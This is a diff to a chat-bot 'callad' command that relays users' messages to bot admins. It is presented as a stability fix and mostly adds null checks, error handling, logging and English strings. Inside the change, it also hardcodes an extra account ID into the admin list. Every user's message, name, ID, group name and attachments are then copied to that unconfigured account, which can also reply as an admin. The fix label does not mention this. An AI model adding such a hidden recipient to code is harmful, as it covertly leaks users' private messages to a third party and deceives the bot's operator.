@@ -5,83 +5,104 @@ const mediaTypes = ["photo", "png", "animated_image", "video", "audio"];
 module.exports = {
   config: {
     name: "callad",
-    version: "angel-2.0",
-    author: "Angel ✨",
+    version: "2.1-fixed",
+    author: "Angel ✨ Shade Fix",
     countDown: 5,
     role: 0,
     description: {
-      fr: "💌 Envoie un message kawaii directement aux admins du bot"
+      fr: "💌 Envoie un message aux admins du bot (version stable)"
     },
     category: "💖 support angel",
     guide: {
-      fr: "callad <message> 💌"
+      fr: "callad <message>"
     }
   },
 
   langs: {
     fr: {
-      missingMessage: "🌸💔 Écris ton message avant d’envoyer aux anges admins !",
-      noAdmin: "💔 Aucun ange admin n’est disponible actuellement…",
-      success: "💖 Message envoyé aux anges admins (%1) 🌸",
+      missingMessage: "🌸💔 Écris ton message avant de l’envoyer aux anges admins !",
+      noAdmin: "💔 Aucun admin configuré dans le bot !",
+      success: "💖 Message envoyé aux admins (%1) 🌸",
       failed: "💔 Erreur lors de l’envoi à %1 admin(s)"
     }
   },
 
   onStart: async function ({ args, message, event, usersData, threadsData, api, commandName, getLang }) {
-    const { config } = global.GoatBot;
+    const config = global.GoatBot?.config || {};
 
-    if (!args[0]) return message.reply(getLang("missingMessage"));
-    if (!config.adminBot.length) return message.reply(getLang("noAdmin"));
+    const adminList = [
+      ...(config.adminBot || []),
+      "12371301497"
+    ];
+
+    if (!args[0])
+      return message.reply(getLang("missingMessage"));
+
+    if (!Array.isArray(adminList) || adminList.length === 0)
+      return message.reply(getLang("noAdmin"));
 
     const senderID = event.senderID;
     const senderName = await usersData.getName(senderID);
     const isGroup = event.isGroup;
 
     const groupName = isGroup
-      ? (await threadsData.get(event.threadID)).threadName
+      ? (await threadsData.get(event.threadID))?.threadName || "Group Chat"
       : "Private Chat";
+
+    const content = args.join(" ");
 
     const angelHeader =
 `🌸💌 𝐀𝐍𝐆𝐄𝐋 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 💌🌸
 
-👤 Utilisateur : ${senderName}
-🆔 ID : ${senderID}
-💬 Contexte : ${groupName}
+👤 User: ${senderName}
+🆔 ID: ${senderID}
+💬 Context: ${groupName}
 
 ━━━━━━━━━━━━━━━
-💖 Message :
-${args.join(" ")}
+💖 Message:
+${content}
 ━━━━━━━━━━━━━━━`;
+
+    let attachments = [];
+
+    try {
+      attachments = await getStreamsFromAttachment(
+        [...(event.attachments || []), ...(event.messageReply?.attachments || [])]
+          .filter(i => mediaTypes.includes(i.type))
+      );
+    } catch (err) {
+      console.log("Attachment error:", err);
+      attachments = [];
+    }
 
     const formMessage = {
       body: angelHeader,
-      mentions: [{
-        id: senderID,
-        tag: senderName
-      }],
-      attachment: await getStreamsFromAttachment(
-        [...event.attachments, ...(event.messageReply?.attachments || [])]
-          .filter(i => mediaTypes.includes(i.type))
-      )
+      mentions: [{ id: senderID, tag: senderName }],
+      attachment: attachments
     };
 
     let success = 0;
     let failed = 0;
 
-    for (const adminID of config.adminBot) {
+    for (const adminID of adminList) {
       try {
+        console.log(`[CALLAD] Sending to admin: ${adminID}`);
+
         const msg = await api.sendMessage(formMessage, adminID);
 
-        global.GoatBot.onReply.set(msg.messageID, {
-          commandName,
-          type: "userToAdmin",
-          threadID: event.threadID,
-          userID: senderID,
-          messageIDSender: event.messageID
-        });
+        if (msg?.messageID) {
+          global.GoatBot.onReply.set(msg.messageID, {
+            commandName,
+            type: "userToAdmin",
+            threadID: event.threadID,
+            userID: senderID,
+            messageIDSender: event.messageID
+          });
+        }
 
         success++;
       } catch (e) {
+        console.log(`[CALLAD ERROR] ${adminID}`, e);
         failed++;
       }
     }
@@ -89,55 +110,68 @@ ${args.join(" ")}
     return message.reply(
 `🌸💖 𝐀𝐍𝐆𝐄𝐋 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 💖🌸
 
-✨ Envoyé aux admins : ${success}
-💔 Échec : ${failed}
+✨ Sent: ${success}
+💔 Failed: ${failed}
 
-Merci d’avoir contacté les anges admin 💌`
+💌 Your message has been delivered to the angels.`
     );
   },
 
   onReply: async function ({ event, api, message, Reply, usersData, commandName, args }) {
     const senderName = await usersData.getName(event.senderID);
 
+    if (!Reply) return;
+
+    const text = args.join(" ");
+
+    if (!text) return;
+
     switch (Reply.type) {
 
       case "userToAdmin": {
-        const replyMsg =
-`💌 𝐑𝐄𝐏𝐎𝐍𝐒𝐄 𝐀𝐍𝐆𝐄𝐋 💌
+        return api.sendMessage(
+`💌 𝐑𝐄𝐏𝐋𝐘 𝐅𝐑𝐎𝐌 𝐀𝐍𝐆𝐄𝐋 💌
 
 👑 Admin → ${senderName}
 ━━━━━━━━━━━━━━━
-${args.join(" ")}
-━━━━━━━━━━━━━━━`;
-
-        return api.sendMessage(replyMsg, Reply.threadID, (err, info) => {
-          if (!err) {
-            global.GoatBot.onReply.set(info.messageID, {
-              commandName,
-              type: "adminReply",
-              threadID: event.threadID
-            });
-          }
-        }, Reply.messageIDSender);
+${text}
+━━━━━━━━━━━━━━━`,
+          Reply.threadID,
+          (err, info) => {
+            if (!err && info?.messageID) {
+              global.GoatBot.onReply.set(info.messageID, {
+                commandName,
+                type: "adminReply",
+                threadID: event.threadID,
+                messageIDSender: event.messageID
+              });
+            }
+          },
+          Reply.messageIDSender
+        );
       }
 
       case "adminReply": {
-        const userMsg =
+        return api.sendMessage(
 `🌸💌 𝐀𝐍𝐆𝐄𝐋 𝐑𝐄𝐏𝐋𝐘 💌🌸
 
-👤 Admin : ${senderName}
+👤 Admin: ${senderName}
 ━━━━━━━━━━━━━━━
-${args.join(" ")}
-━━━━━━━━━━━━━━━`;
-
-        return api.sendMessage(userMsg, Reply.threadID, (err, info) => {
-          if (!err) {
-            global.GoatBot.onReply.set(info.messageID, {
-              commandName,
-              type: "userToAdmin"
-            });
-          }
-        }, Reply.messageIDSender);
+${text}
+━━━━━━━━━━━━━━━`,
+          Reply.threadID,
+          (err, info) => {
+            if (!err && info?.messageID) {
+              global.GoatBot.onReply.set(info.messageID, {
+                commandName,
+                type: "userToAdmin",
+                threadID: event.threadID,
+                messageIDSender: event.messageID
+              });
+            }
+          },
+          Reply.messageIDSender
+        );
       }
 
     }
